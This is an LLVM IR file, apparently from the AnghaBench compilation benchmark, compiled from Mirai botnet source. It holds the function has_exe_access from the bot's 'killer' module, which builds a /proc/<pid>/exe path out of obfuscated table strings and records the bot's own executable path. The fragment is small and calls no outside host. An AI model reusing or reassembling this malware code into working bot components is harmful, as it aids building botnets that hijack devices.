; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_killer.c_has_exe_access.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_killer.c_has_exe_access.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@PATH_MAX = common dso_local global i32 0, align 4
@TABLE_KILLER_PROC = common dso_local global i32 0, align 4
@TABLE_KILLER_EXE = common dso_local global i32 0, align 4
@O_RDONLY = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@killer_realpath = common dso_local global i8* null, align 8
@TRUE = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 ()* @has_exe_access to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @has_exe_access() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [16 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = load i32, i32* @PATH_MAX, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %2, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %3, align 8
  store i8* %12, i8** %4, align 8
  %13 = load i32, i32* @TABLE_KILLER_PROC, align 4
  %14 = call i32 @table_unlock_val(i32 %13)
  %15 = load i32, i32* @TABLE_KILLER_EXE, align 4
  %16 = call i32 @table_unlock_val(i32 %15)
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* @TABLE_KILLER_PROC, align 4
  %19 = call i32 @table_retrieve_val(i32 %18, i32* null)
  %20 = call i32 @util_strcpy(i8* %17, i32 %19)
  %21 = load i8*, i8** %4, align 8
  %22 = sext i32 %20 to i64
  %23 = getelementptr inbounds i8, i8* %21, i64 %22
  store i8* %23, i8** %4, align 8
  %24 = load i8*, i8** %4, align 8
  %25 = call i32 (...) @getpid()
  %26 = getelementptr inbounds [16 x i8], [16 x i8]* %5, i64 0, i64 0
  %27 = call i32 @util_itoa(i32 %25, i32 10, i8* %26)
  %28 = call i32 @util_strcpy(i8* %24, i32 %27)
  %29 = load i8*, i8** %4, align 8
  %30 = sext i32 %28 to i64
  %31 = getelementptr inbounds i8, i8* %29, i64 %30
  store i8* %31, i8** %4, align 8
  %32 = load i8*, i8** %4, align 8
  %33 = load i32, i32* @TABLE_KILLER_EXE, align 4
  %34 = call i32 @table_retrieve_val(i32 %33, i32* null)
  %35 = call i32 @util_strcpy(i8* %32, i32 %34)
  %36 = load i8*, i8** %4, align 8
  %37 = sext i32 %35 to i64
  %38 = getelementptr inbounds i8, i8* %36, i64 %37
  store i8* %38, i8** %4, align 8
  %39 = load i32, i32* @O_RDONLY, align 4
  %40 = call i32 @open(i8* %12, i32 %39)
  store i32 %40, i32* %6, align 4
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %44

42:                                               ; preds = %0
  %43 = load i32, i32* @FALSE, align 4
  store i32 %43, i32* %1, align 4
  store i32 1, i32* %8, align 4
  br label %69

44:                                               ; preds = %0
  %45 = load i32, i32* %6, align 4
  %46 = call i32 @close(i32 %45)
  %47 = load i32, i32* @TABLE_KILLER_PROC, align 4
  %48 = call i32 @table_lock_val(i32 %47)
  %49 = load i32, i32* @TABLE_KILLER_EXE, align 4
  %50 = call i32 @table_lock_val(i32 %49)
  %51 = load i8*, i8** @killer_realpath, align 8
  %52 = load i32, i32* @PATH_MAX, align 4
  %53 = sub nsw i32 %52, 1
  %54 = call i32 @readlink(i8* %12, i8* %51, i32 %53)
  store i32 %54, i32* %7, align 4
  %55 = icmp ne i32 %54, -1
  br i1 %55, label %56, label %61

56:                                               ; preds = %44
  %57 = load i8*, i8** @killer_realpath, align 8
  %58 = load i32, i32* %7, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  store i8 0, i8* %60, align 1
  br label %61

61:                                               ; preds = %56, %44
  %62 = load i8*, i8** %4, align 8
  %63 = ptrtoint i8* %62 to i64
  %64 = ptrtoint i8* %12 to i64
  %65 = sub i64 %63, %64
  %66 = trunc i64 %65 to i32
  %67 = call i32 @util_zero(i8* %12, i32 %66)
  %68 = load i32, i32* @TRUE, align 4
  store i32 %68, i32* %1, align 4
  store i32 1, i32* %8, align 4
  br label %69

69:                                               ; preds = %61, %42
  %70 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %70)
  %71 = load i32, i32* %1, align 4
  ret i32 %71
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @table_unlock_val(i32) #2

declare dso_local i32 @util_strcpy(i8*, i32) #2

declare dso_local i32 @table_retrieve_val(i32, i32*) #2

declare dso_local i32 @util_itoa(i32, i32, i8*) #2

declare dso_local i32 @getpid(...) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @table_lock_val(i32) #2

declare dso_local i32 @readlink(i8*, i8*, i32) #2

declare dso_local i32 @util_zero(i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
